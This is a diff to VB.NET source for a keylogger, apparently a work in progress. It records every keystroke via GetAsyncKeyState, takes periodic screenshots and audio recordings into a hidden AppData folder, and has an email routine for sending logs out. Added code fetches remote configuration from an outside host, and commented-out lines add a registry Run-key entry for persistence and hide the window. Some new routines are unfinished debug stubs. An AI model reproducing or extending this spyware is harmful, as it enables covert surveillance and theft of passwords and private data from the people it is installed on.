@@ -1,4 +1,5 @@
 ﻿Imports System.IO
+Imports System.Net
 Imports System.Net.Mail
 Imports System.Runtime.InteropServices
 
@@ -10,15 +11,23 @@ Public Class Form1
     Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Integer) As Short
     Public log As String
 
-    Dim log_timer As Integer = 11000
+    Dim log_timer As Integer = 60000
     Dim current_time As Integer = 0
+    Dim screenshots_per_session As Integer = 10
+    Dim current_screenshot_count As Integer = 1
+    Dim ss_interval = log_timer / screenshots_per_session * current_screenshot_count
 
     Dim roaming_folder_path As String = "/vbnetkl"
     Dim session_id
     Dim previous_session_id
 
-    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
 
+    'Tool Configs
+    Dim RecordingEnabled As Boolean
+    Dim LogTimer As Integer
+    Dim ScreenshotPerSerrsion As Integer
+
+    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
         If (GetAsyncKeyState(65)) Then
             log = log + "A"
         ElseIf (GetAsyncKeyState(66)) Then
@@ -170,17 +179,21 @@ Public Class Form1
         'Me.ShowInTaskbar = True
         'End If
 
-        If current_time = 500 Then
-            PictureBox1.Image = TakeScreenshot()
-            Dim pic = PictureBox1.Image
-            pic.Save(IO.Path.Combine(GetAppDataPath() & roaming_folder_path & "/" & session_id, GenerateGUID() & ".jpg"), Imaging.ImageFormat.Jpeg)
-        End If
 
 
         current_time = current_time + Timer1.Interval
+
+        If current_time = ss_interval Then
+            TakeScreenshot()
+            current_screenshot_count += 1
+            ss_interval = log_timer / screenshots_per_session * current_screenshot_count
+        End If
         If current_time >= log_timer Then
-            SendLog()
+            File.WriteAllText(GetAppDataPath() & roaming_folder_path & "/" & session_id & "/" & GenerateGUID() & ".txt", RichTextBox1.Text)
+            'SendLog()
             current_time = 0
+            current_screenshot_count = 1
+            ss_interval = log_timer / screenshots_per_session * current_screenshot_count
             previous_session_id = session_id
             session_id = GenerateGUID()
             If Not System.IO.Directory.Exists(GetAppDataPath() & roaming_folder_path & "/" & session_id) Then
@@ -193,13 +206,14 @@ Public Class Form1
         Return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
     End Function
 
-    Private Function TakeScreenshot()
+    Private Sub TakeScreenshot()
         Dim screenSize As Size = New Size(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
         Dim screenGrab As New Bitmap(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
         Dim g As Graphics = Graphics.FromImage(screenGrab)
         g.CopyFromScreen(New Point(0, 0), New Point(0, 0), screenSize)
-        Return screenGrab
-    End Function
+        'Return screenGrab
+        screenGrab.Save(IO.Path.Combine(GetAppDataPath() & roaming_folder_path & "/" & session_id, GenerateGUID() & ".jpg"), Imaging.ImageFormat.Jpeg)
+    End Sub
 
     Private Function GenerateGUID()
         Dim sGUID As String
@@ -208,6 +222,10 @@ Public Class Form1
     End Function
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        'My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath)
+        'My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).DeleteValue(Application.ProductName)
+        LoadOnlineConfigs()
+        Directory.Delete(GetAppDataPath() & roaming_folder_path, True)
         session_id = GenerateGUID()
         If Not System.IO.Directory.Exists(GetAppDataPath() & roaming_folder_path) Then
             System.IO.Directory.CreateDirectory(GetAppDataPath() & roaming_folder_path)
@@ -216,6 +234,20 @@ Public Class Form1
 
     End Sub
 
+    Private Sub LoadOnlineConfigs()
+        Dim address As String = "https://pubstatic.com/vbnetkl_configs.ini"
+        Dim client As WebClient = New WebClient()
+        Dim reader As StreamReader = New StreamReader(client.OpenRead(address))
+        TextBox1.Text = reader.ReadToEnd
+    End Sub
+
+    Private Sub LoadConfigs()
+
+        For Each s As String In Me.TextBox1.Lines
+            Dim str2() As String = Split(s, ",")
+        Next
+
+    End Sub
 
     Private Sub SendEmail()
         Try
@@ -246,8 +278,9 @@ Public Class Form1
     End Sub
 
     Private Sub StartLogging()
+
         Timer1.Start()
-        'StartRecording()
+        StartRecording()
         If Not System.IO.Directory.Exists(GetAppDataPath() & roaming_folder_path & "/" & session_id) Then
             System.IO.Directory.CreateDirectory(GetAppDataPath() & roaming_folder_path & "/" & session_id)
         End If
@@ -257,9 +290,9 @@ Public Class Form1
 
     Private Sub SendLog()
         SendEmail()
-        If previous_session_id = "" Then
-            Directory.Delete(GetAppDataPath() & roaming_folder_path & "/" & previous_session_id, True)
-        End If
+        'If previous_session_id = "" Then
+        'Directory.Delete(GetAppDataPath() & roaming_folder_path & "/" & previous_session_id, True)
+        'End If
     End Sub
 
     Private Sub StartRecording()
@@ -277,6 +310,29 @@ Public Class Form1
     End Sub
 
     Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
-        PictureBox1.Image = TakeScreenshot()
+        TakeScreenshot()
+    End Sub
+
+    Private Sub UpdateVars()
+        Label6.Text = log_timer
+        Label7.Text = current_time
+        Label8.Text = screenshots_per_session
+        Label9.Text = current_screenshot_count
+        Label10.Text = ss_interval
+    End Sub
+
+    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
+        UpdateVars()
+    End Sub
+
+    Private Sub Form1_Shown(sender As Object, e As EventArgs) Handles MyBase.Shown
+        'Me.Visible = False
+    End Sub
+
+    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs) Handles TextBox1.TextChanged
+        Dim objIniFile As New clsIni("vbnetkl_configs.ini")
+        Dim x As Integer
+        x = objIniFile.GetInteger("CONFIGS", "EnabledRecording", 0)
+        MsgBox(x.ToString())
     End Sub
 End Class
